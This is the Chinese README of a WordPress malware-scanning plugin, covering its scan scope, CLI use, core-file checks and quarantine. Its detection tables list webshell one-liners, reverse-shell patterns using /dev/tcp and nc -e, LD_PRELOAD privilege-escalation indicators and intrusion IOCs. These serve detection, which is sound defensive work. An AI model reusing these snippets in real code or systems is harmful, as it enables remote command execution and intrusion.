# IO Virus Cleaner

扫描并清理 2026-09 至 2026-10 这次入侵留下的 PHP 木马、Linux 远控程序和提权文件，也会按通用特征找常见的 WebShell。只读文件，不运行可疑程序。扫描本身不连接外部地址；只有两处会联网：检查插件更新，以及你主动勾选的「校验 WordPress 核心文件」。

启用后，在「插件」列表该插件下方点「扫描」，或打开「工具 → 病毒清理」。

## 终端窗口（1.1.0）

扫描页的输入框下面有一个黑底的终端窗口，点「开始扫描」后实时显示：

- 扫描范围：本站的哪些目录、额外目录、临时目录；被跳过的目录和原因。
- 当前进度：终端最下面一行实时刷新约多少百分比，以及正在扫的目录、已检查多少文件和目录、命中多少、还剩多少目录、已用多少秒。
- 命中的文件：发现一个就立刻输出一行。红色是高可信，黄色是「可疑」。
- 无法读取的目录：扫完时列出，一般是权限不够，或被 `open_basedir` 挡住。

扫完 1 秒后自动刷新，下面显示结果表格。刷新后终端里保留上一次扫描的日志。扫描中可以点「停止」。

实现方式（1.1.0 起优先用 SSE，不通自动退回轮询）：

- **SSE（优先）**：服务器边扫边推，每约 0.6 秒推一批，命中一个文件马上显示。每条连接最多 45 秒，到时间服务器让页面重连，扫描状态已保存，接着扫，避开 Nginx、PHP-FPM 的超时。服务器会关掉 PHP 缓冲和压缩，并发送 `X-Accel-Buffering: no`，让 Nginx 不缓冲这条响应。
- **轮询（自动备用）**：页面 6 秒内没收到 SSE 数据（被 Nginx、CDN 或代理缓冲了），或连接出错，会在终端里提示并改用轮询：服务器把要扫的目录排成队列，页面每次请求处理约 2.5 秒就返回进度，再请求下一批。SSE 中途断线时从已保存的进度继续，已经显示过的命中文件不会重复显示。请求连续失败 3 次会停下并提示。

两种方式都不受 PHP 执行时间限制，扫多大的目录都不会超时。点「停止」会删掉扫描状态，服务器那边的 SSE 连接最迟约 3 秒内自己结束。

如果 SSE 一直连不上，检查是否有：宝塔「网站设置 → 配置文件」里 `fastcgi_buffering on` 之类的缓冲配置、套了 Cloudflare 等 CDN（会缓冲或限制长连接）、Nginx 开了 gzip 且包含 `text/event-stream`。不影响使用，只是退回到轮询。

页面脚本被禁用时，「开始扫描」按钮仍然可用，只是没有进度，要等扫完整页刷新；命令行方式 `wp io-vc scan` 不受影响。

## 扫描范围

- `wp-content/plugins`（本插件自身目录除外）
- `wp-content/mu-plugins`
- `wp-admin`、`wp-includes`（核心目录，3000 多个文件不到 1 秒，攻击者常把后门放这里）
- **额外目录**（可选）：扫描页面最上面的输入框，每行一个绝对路径，保存后下次还在
- `wp-content/uploads`，以及 WordPress 实际使用的上传目录
- `wp-content/themes`
- 站点根目录和 `wp-content` 下的 PHP 文件
- 系统 `/tmp`、WordPress 临时目录、`sys_get_temp_dir()`。`/tmp` 会再看下一层子目录

命中一个文件后，会再看同一层的脚本，以及旁边的 `.data` 目录。

### 扫描整个 wwwroot（多个站点）

在页面输入框里填 `/www/wwwroot`，会连同里面的所有站点一起扫。其他站点的主题、插件、上传目录按同样的规则判断，OneNav、Swallow、ioTab 的加密文件也会被排除。

- 限制：根目录 `/` 和 `/proc`、`/sys`、`/dev`、`/etc`、`/usr` 等系统目录不收；不存在或不是绝对路径的，会在结果页上方提示。
- 宝塔默认开着「防跨站攻击」，PHP 的 `open_basedir` 只允许读本站目录。**开着它的时候，网页里扫不到 `/www/wwwroot`**，这是 PHP 的安全边界，运行中的网页没法绕过。之前能扫是因为当时它是关着的。这种情况页面会写明被 `open_basedir` 挡住以及它允许的范围，并给出下面的命令。有两个办法：
    1. **在服务器上用命令行扫**（推荐，不受 `open_basedir` 限制，防跨站攻击可以一直开着）。只列出结果，不删除、不隔离：

        ```
        php /www/wwwroot/你的站点/wp-content/plugins/io-virus-cleaner/cli.php --dir=/www/wwwroot
        ```

        不带 `--dir` 只扫本站，多个目录用逗号隔开。命中打到标准输出，进度和汇总打到标准错误，所以 `php cli.php --dir=... > result.txt` 得到的只有结果。有高可信命中时退出码为 1。装了 WP-CLI 的话也可以用 `wp io-vc scan --dir=/www/wwwroot --allow-root`。
    2. 在宝塔里临时关掉对应站点的「防跨站攻击」，再在页面里扫，**扫完请马上重新打开**（见下）。
- 输入框里的目录被拒绝时也会保留，不用重新输入。
- **不是宝塔也能用。** `open_basedir` 是 PHP 自带的机制，被挡住的判断、命令行扫描、排除目录都跟面板无关。只有下面几处会按环境区分：
    - 站点放在 `/www/wwwroot/` 下，才当作宝塔：提示里会用「防跨站攻击」这个名字和宝塔的操作路径；其他环境只写 `open_basedir`，操作改成「改 PHP 配置」。
    - 扫描页顶部的「当前状态」只有 PHP 会读 `.user.ini` 时（FPM、CGI、LiteSpeed；Apache `mod_php` 不读）才去对比文件和实际生效值。宝塔里文件就是开关；其他环境只有 `.user.ini` 里写了 `open_basedir` 才以它为准，没写就说明设置在 PHP-FPM 池配置、虚拟主机或 `php.ini` 里，这时只显示实际生效的值，不提缓存。
- **扫完请重新打开「防跨站攻击」。** 它是宝塔对 PHP 设置的 `open_basedir`，关着的时候，任何一个站被入侵，攻击者都能读写同一台服务器上其他站点的文件，包括 `wp-config.php`。操作：宝塔面板 → 网站 → 对应站点「设置」→「网站目录」→ 勾选「防跨站攻击(open_basedir)」→ 保存。关过几个站点就要打开几个。插件检测到「没有 `open_basedir` 限制，并且保存了本站以外的扫描目录」时，会在扫描页上方显示这条提醒。
- 28 个站点约 1GB 的 `wwwroot`，耗时 15 秒左右。页面请求最长等 5 分钟，超时就改用命令行。
- 隔离的文件会移到**当前站点**的 `wp-content/io-virus-quarantine/` 里，即使它原来在别的站点。

### 排除目录（1.1.0）

扫描页「排除的目录」输入框，每行一条，下次打开页面还在。三种写法：

| 写法 | 例子 | 效果 |
| --- | --- | --- |
| 绝对路径 | `/www/wwwroot/backup` | 这个目录和里面的所有内容都不扫 |
| 相对本站根目录的路径（带 `/`） | `wp-content/uploads/2020` | 同上，从本站根目录算起 |
| 目录名（不带 `/`） | `test` | 任何位置叫 `test` 的目录都不扫 |

- 排除的目录里就算有木马也不会被发现，只排除确认安全的目录。
- 起始目录本身被排除时，整个目录不扫；单个文件不能排除。
- 命令行用 `--exclude=`，多条用逗号隔开：`php cli.php --dir=/www/wwwroot --exclude=/www/wwwroot/backup,wp-content/uploads/2020,test`（WP-CLI 同名参数）。命令行的排除只在这一次生效，不保存。
- 开始扫描时，终端窗口会列出这次生效的排除规则。

为了快，扫描时会这样处理：

- `vendor`、`node_modules`、`.git`、`cache`、`wflogs`、`wordfence`、`sucuri-scanner` 目录整个不进入。
- 主题和插件里的图片、字体、样式、脚本、翻译文件（`png`、`js`、`css`、`mo` 等），不再逐个读内容找本次入侵的特征。图片里夹带 PHP 的检查仍然保留，上传目录、`/tmp`、`.data` 里的文件照常全查。
- 同一个目录只遍历一次，同一个文件只读一次。

一个有 5 万多个文件、约 1GB 的站点，扫描时间从约 10 秒降到 3 秒左右。

`wp-config.php`、`.user.ini`、`.htaccess` 和主题 `functions.php` 里如果出现已知木马文件名，只列出来，不会自动修改。

## 能识别的内容

### 文件名

文件名里的特殊连字符会先换成普通连字符再比较。

| 名称 | 说明 |
|---|---|
| `io-cache-helper.php`、`io-perf-helper.php`、`io-perf-monitor.php`、`io-assets-cache.php`、`io-thumb-cache.php` | 会互相复制的木马 |
| `io-sh.php` | 上传目录里的命令脚本 |
| `gen_x.php`、`gen_wlb.php` | 伪造登录凭证 |
| `c2io.php` | 在旁边建立 `.data` 并写入记录 |
| `*_io_c.php`、`*_io_x.php` | 头像目录里的命令脚本，例如 `1790771898_io_c.php` |
| `wlb_*.php`、`wlb_*.txt`、`wlb_*.bak`、`wlb_*.log` | `/tmp` 工作目录里的脚本、命令、用户列表和配置备份 |
| `pwn.so` | 通过 `LD_PRELOAD` 提权的共享库 |
| `.io_agent_` 加 8 位十六进制 | 远控临时锁文件 |
| `ovd-年-月-日-数字.log` | 远控键盘记录 |
| `/tmp` 里的 `ant`、`ant.log`、`rootbash`、`pwn_done` | `ant` 仅在体积超过 1MB，或内容里有这次远控的特征时列出 |

### 内容特征（本次入侵）

不依赖文件名。512KB 以内的文件都会查。更大的 PHP、日志、文本，以及 `/tmp` 或 `.data` 里 16MB 以内的文件，会分段继续查。

能对上的字符串包括：

- `IO_HEAL_BOOT`、`IO_AGENT_BOOT`、`IOOK_AIDHB`
- `IO Cache Helper -`、`IO Perf Monitor -`
- `xxnkey2026`、`xxn12026k`、`xxngen12026`、`wqdc2key2026`、`wlbgen20`
- `plugin_binalar_eski`
- `/etc/ld.so.preload`、`/tmp/rootbash`、`/tmp/pwn_done`
- `216.167.81.141`、`ai.025gl.com`

### 通用木马特征（1.0.3 新增）

不依赖这次入侵的名字，针对常见 WebShell 的写法。只看 PHP 类文件（`php`、`phtml`、`php3`~`php7`、`pht`、`phar`、`inc`），1MB 以内。

**高可信**，几乎不会出现在正常代码里，默认勾选：

| 原因 | 例子 |
|---|---|
| eval/assert 直接执行请求参数 | `eval($_POST['a'])`，`eval(base64_decode($_REQUEST['z']))` |
| 请求参数经变量传给 eval/assert | `$b=substr($_POST['s'],1); eval(base64_decode($b));`，`$a=decoder($_POST['data']); @eval($a);`（一句话后门常见写法，300 个字符以内） |
| 函数名用 `\x` 转义藏起来 | `"\x63\x72\x65\x61\x74\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e"`（`create_function`） |
| 系统命令直接执行请求参数 | `system($_GET['c'])`，`shell_exec`、`passthru`、`popen` 等 |
| 请求参数当函数名调用 | `$_POST['f']($_POST['x'])` |
| 回调函数由请求参数指定 | `call_user_func($_GET[..])`，`array_map($_POST[..], ..)` |
| preg_replace /e 执行请求参数 | `preg_replace('/x/e', $_POST[..], ..)` |
| eval 执行 php://input | `eval(file_get_contents('php://input'))` |
| create_function 接收请求参数 | |
| include 请求参数指定的文件 | `include($_GET['p'])` |
| 按请求参数写文件 | `file_put_contents($_POST['f'], ..)` |
| 函数名用 base64 藏起来 | `"ZXZhbA=="`（eval）、`c3lzdGVt`（system）等 |
| 请求头内容直接执行 | `eval($_SERVER['HTTP_X_CMD'])`，不走 GET/POST，改从请求头里取代码 |
| 危险函数当回调处理请求参数 | `array_map('assert', array($_POST['x']))`，`call_user_func('system', $_GET['c'])` |
| 请求参数存进变量再当函数调用 | `$f=$_POST['f']; $f($_POST['x']);`（200 个字符以内） |
| 请求参数直接决定登录用户 | `wp_set_auth_cookie((int)$_GET['u'])`，用请求里的用户 ID 直接签发登录 Cookie，等于免密码登录任意账号 |
| 反弹 shell | `bash -i >& /dev/tcp/IP/端口`；`nc -e /bin/sh`；`mkfifo /tmp/x … /bin/sh -i`；`fsockopen` 后接 `proc_open`、`exec` 等并带 `/bin/sh`。这几条不需要请求参数 |
| 上传目录里的常见 WebShell 文件名 | 上传目录里叫 `c99.php`、`r57.php`、`wso.php`、`b374k.php`、`indoxploit.php`、`p0wny.php`、`alfashell.php`、`webshell.php`、`filesman.php`（含 `phtml`、`pht`、`phar` 扩展名） |
| 已知 WebShell 特征 | `FilesMan`、`c99shell`、`r57shell`、`b374k`、`wso_version`、`IndoXploit`、`Weevely`、`China Chopper`、`PHPSpy`、`p0wny`、`Ani-Shell`、`Safe0ver`、`ALFA TEaM`，并且同时有执行函数 |
| 函数名整批用十六进制藏起来 | 同一个文件里有 6 个以上用十六进制写出来的函数名，例如 `'7068705f756e616d65'`（`php_uname`）、`'617373657274'`（`assert`）。MARIJuANA 之类的文件管理器 WebShell 常用 |
| 已知 WebShell：MARIJuANA 文件管理器 | 页面标题带 `MARIJuANA`，并且读取 `$_FILES`、`$_GET`、`$_POST` |
| 十六进制字符串还原代码 | 120 位以上的十六进制串，加 `hex2bin` 或 `pack('H*')` |
| 图片里夹带 PHP 代码 | `jpg`、`png`、`gif`、`webp`、`ico`、`bmp` 的头尾 8KB 里有 `<?php` 和危险函数 |
| 上传目录里让图片或文本按 PHP 执行 | 上传目录 `.htaccess` 里的 `AddType`、`AddHandler`、`SetHandler`、`ForceType` 指向 php |
| 上传目录里自动包含 PHP 文件 | 上传目录里的 `.htaccess`、`.user.ini` 设置了 `auto_prepend_file` |

**可疑**，原因以「可疑」开头，正常的加密主题、老插件偶尔也会用到，默认不勾选，请先看内容再决定：

- 可疑：eval 解码后执行（`eval(gzinflate(base64_decode(..)))`）
- 可疑：用 chr 拼出函数名
- 可疑：遍历目录批量改文件时间（递归 `scandir` 加 `touch`，WebShell 常用它把时间改乱来躲过按修改时间的排查）
- 可疑：用客户端文件名保存上传（`move_uploaded_file` 的目标用 `$_FILES[..]['name']`）
- 可疑：代码里直接创建管理员（`wp_create_user`、`wp_insert_user`、`wp_update_user` 的参数里带 `'administrator'`；后门常用它悄悄加账号，但正常的安装向导、会员插件也可能这样写）
- 可疑：上传目录中的 PHP 文件（内容只有「Silence is golden」的 `index.php` 除外）
- 可疑：自动包含 PHP 文件（上传目录以外出现 `auto_prepend_file`）

**一主题自带的加密文件不会被列为「可疑」。** 目前认这三个：

| 来源 | 位置条件 |
|---|---|
| OneNav 主题 | 在 `wp-content/themes/某个主题/` 下，该主题 `style.css` 里是 `Theme Name: OneNav` |
| Swallow 主题 | 同上，`Theme Name: Swallow` |
| ioTab 插件 | 在 `wp-content/plugins/某个插件/` 下，该插件目录顶层有 PHP 文件头部写着 `Plugin Name: ioTab` |

文件本身也要符合加密工具的外壳，两种之一：

- `<?php function&…(){static $a=NULL;if($a===NULL){$a=eval(gzinflate(`（`eval(`可有可无，`gzuncompress` 也行），前面可以带 `namespace Z5Encrypt\…;`
- `<?php /* --Copyright:https://www.phpcodejm.com` 开头的另一种混淆文件（ioTab 里的 `plugin.php`）

位置和外壳缺一不可。同样的文件放在 uploads 里、别的主题或插件里，仍然会列出。这条只排除「可疑」类，高可信特征和本次入侵的特征不受影响。

以后要加别的主题或插件，改 `is_theme_encrypted()` 里的 `Theme Name` 和 `Plugin Name` 正则即可。

扫描时会跳过 `wflogs`、`wordfence`、`sucuri-scanner` 目录，它们保存的是攻击日志和规则，里面本来就有大量木马片段。

### 上传目录或 `/tmp` 里的 `.data`

这两个位置下，目录名是 `.data` 时，里面的文件都会列出，不要求文件名一定是 `a_` 加随机字符再加 `.j`。记录删空后，空目录会去掉。

### 静态链接的远控程序

对应安全报告里的这几类行为，用文件内容判断，不看实时流量：

| 报告里的行为 | 插件怎么认 |
|---|---|
| 静态链接 | ELF，且文件头里没有动态链接器 |
| TCP / WebSocket | 含 `wss://` 或 WebSocket 相关字符串 |
| DNS 请求 | 同时含域名解析函数 |
| 创建文件或目录 | 同时含创建目录、创建文件的函数 |
| YARA | 用上面几条组成一条规则，不调用外部 YARA |

四条同时满足才列出。结果原因是「静态链接 ELF；含 WebSocket 与 DNS 解析；会创建文件」。普通的静态链接程序，或只有 HTTPS 字符串的程序，不会被算进去。

## 计划任务：每天自动扫描（可选，默认关闭）

扫描页的「计划任务」里勾选「每天自动扫描一次」并保存，插件会用 WP-Cron 每天站点时间凌晨 3 点左右扫一遍：

- 范围和设置同页面上保存的：额外扫描的目录、排除的目录、是否校验核心文件。
- 结果存下来，页面上显示上一次自动扫描的时间、耗时和命中数，点「查看这次结果」可以把它放进结果区，像手动扫描一样勾选隔离或删除。
- 勾选「发现新的高可信命中时发邮件」（默认勾选）：有**新出现**的高可信命中，或核心文件校验有新的异常时，发邮件到站点的管理员邮箱。同样的命中不会每天重复发。「可疑」类不发邮件，只在页面上显示。
- **只扫描和通知，不会自动删除或隔离任何文件。**
- 插件停用时会清掉计划任务；开着但任务丢了（清过 cron、迁移过站点），打开后台会自动补上。
- WP-Cron 靠有人访问站点来触发。访问量很小的站，或在 `wp-config.php` 里设了 `DISABLE_WP_CRON`，要在服务器上用系统计划任务定时访问 `wp-cron.php`，例如每 5 分钟：`*/5 * * * * curl -s https://你的站点/wp-cron.php?doing_wp_cron >/dev/null`。
- 开着 `open_basedir` 时，自动扫描和网页上一样读不到本站以外的目录；要扫整个 wwwroot，请用服务器上的系统计划任务跑 `php cli.php --dir=/www/wwwroot`。

## WordPress 核心文件校验（可选，默认关闭）

扫描页「开始扫描」上面有一个复选框「同时校验 WordPress 核心文件」。勾选后，插件会连接 `api.wordpress.org` 取当前版本的官方文件校验值（MD5），对每个 WordPress 站点做两件事：

| 检查 | 说明 |
|---|---|
| 核心文件被修改 | `wp-admin`、`wp-includes` 和根目录里的核心文件（`index.php`、`wp-login.php` 等），和官方 MD5 不一致 |
| 多出的 PHP 文件 | `wp-admin`、`wp-includes` 里官方安装包没有的 PHP 文件，木马常放在这里伪装成核心文件 |

- **校验哪些站点**：本站，加上「额外扫描的目录」本身和它下面一层目录里的 WordPress（`/www/wwwroot/各个站点`）。每个站点按自己的版本和语言包（`wp-includes/version.php` 里的 `$wp_version`、`$wp_local_package`）校验；官方没有收录该语言包时退回 `en_US`。
- **不校验**：`wp-content`（主题、插件、上传文件本来就会变）、`wp-config.php`、被排除的目录。官方有、本地没有的文件只统计，不算问题。
- **结果只列出，不提供删除或隔离**：核心文件被误删会让站点打不开。被修改的文件，确认不是自己改的后，到「仪表盘 → 更新」重新安装当前版本，或在服务器上执行 `wp core download --force --skip-content`；多出的 PHP 文件看过内容后手动删除。
- **命令行**：`php cli.php --dir=/www/wwwroot --core-check`（WP-CLI 同名参数 `--core-check`）。被修改、多出的文件打到标准输出（`[核心] …`），每个站点的汇总打到标准错误。命令行不读页面上保存的复选框，只看有没有 `--core-check`。核心校验的结果不影响退出码。
- **联网**：只请求 `https://api.wordpress.org/core/checksums/1.0/`，只发版本号和语言包。同一个版本的校验值缓存 12 小时。联不上时，该站点的结果里写明原因，其余扫描照常。
- **改动很多时**：每个站点最多列出 300 条。如果几乎所有文件都被判为修改，多半是版本或语言包对不上，先确认站点实际版本。

## 处理方式

- **隔离**：移到 `wp-content/io-virus-quarantine/年月日-时分秒/`，文件名加上 `.txt`，并放入禁止直接访问的 `index.php` 和 `.htaccess`。
- **删除隔离文件**：页面里有隔离内容时会出现提示和按钮，点击后清空隔离目录里的文件和空子目录。
- **删除**：直接删除勾选的文件。

这些 PHP 文件会互相复制。处理完再扫描一次。隔离或删除前，如果进程还在跑，文件可能被写回来。

## 不包含的能力

- 不执行可疑文件，不监听网卡，看不到正在发生的 TCP 或 DNS。
- 核心文件校验只管 WordPress 核心，不校验主题和插件；也不检查数据库里的注入内容。
- 不修改 `wp-config.php`、`.htaccess`、`.user.ini`。
- 不扫描 `vendor`、`node_modules`、`.git`、`cache` 目录。如果后门藏在这些目录里，插件看不到。
- 通用特征只能抓写法直白的木马。变量拼接、多层混淆的变种可能漏掉。
- 不能代替更换数据库密码、WordPress 密钥盐和用户密码。

## 自动更新

插件头里写了 `Update URI: https://www.iotheme.cn/io-plugin/io-virus-cleaner/`，WordPress 不会再去 wordpress.org 找它，改为到这个目录取更新。后台「插件」页出现「有新版本」，点更新就行。

服务器上放这两个静态文件就够了，不需要 PHP：

```
https://www.iotheme.cn/io-plugin/io-virus-cleaner/info.json
https://www.iotheme.cn/io-plugin/io-virus-cleaner/io-virus-cleaner-1.2.1.zip
```

`info.json`（`version`、`download`、`sha256` 必填）：

```json
{
  "version": "1.2.1",
  "download": "https://www.iotheme.cn/io-plugin/io-virus-cleaner/io-virus-cleaner-1.2.1.zip",
  "sha256": "zip 文件的 sha256，64 位小写十六进制",
  "homepage": "https://www.iotheme.cn/",
  "requires": "5.8",
  "requires_php": "7.4",
  "changelog": "新增 xxx\n修复 xxx"
}
```

发新版：

1. 改插件头的 `Version` 和 `const VERSION`，两处要一致。
2. 在 `wp-content/plugins` 目录打包。zip 里的顶层目录必须叫 `io-virus-cleaner`：
   ```
   zip -r io-virus-cleaner-1.2.1.zip io-virus-cleaner -x '*.DS_Store' -x 'io-virus-cleaner/docs/*' -x 'io-virus-cleaner/.git/*'
   shasum -a 256 io-virus-cleaner-1.2.1.zip     # Linux 用 sha256sum
   ```
3. 把 zip 传到服务器，再更新 `info.json`（`version`、`download`、`sha256`、`changelog`）。**先传 zip，最后传 `info.json`**，避免用户看到更新却下载不到。

安全限制：
- `info.json` 里的 `download` 必须是 `https://www.iotheme.cn/io-plugin/io-virus-cleaner/` 下的 `.zip`，并且必须有 `sha256`，缺一个就当作没有更新。
- 安装前插件会自己下载 zip 并校验 `sha256`，对不上就取消，不会装。
- 检查更新的结果缓存 1 小时；失败时 10 分钟后再试。
- 站点要先手动装一次带 `Update URI` 的版本（就是现在这个版本），之后才能自动更新。
